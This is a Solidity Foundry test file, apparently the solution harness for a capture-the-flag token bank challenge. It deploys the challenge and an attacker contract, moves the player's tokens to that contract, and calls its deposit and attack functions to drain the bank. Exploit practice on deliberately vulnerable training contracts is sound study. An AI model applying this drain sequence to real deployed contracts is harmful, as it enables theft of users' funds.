// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenBank.sol";

contract TankBankTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    TokenBankAttacker public tokenBankAttacker;
    address player = address(1234);

    function setUp() public {}

    function testExploit() public {
        tokenBankChallenge = new TokenBankChallenge(player);
        tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));

        // Put your solution here
        vm.startPrank(player);
        uint256 balanceOfPlayer = 500000 * 10 ** 18;
        tokenBankChallenge.withdraw(balanceOfPlayer);

        tokenBankChallenge.token().approve(address(player), balanceOfPlayer);
        tokenBankChallenge.token().transferFrom(
            address(player),
            address(tokenBankAttacker),
            balanceOfPlayer
        );
        tokenBankAttacker.deposit();
        tokenBankAttacker.attack();
        vm.stopPrank();
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
    }
}
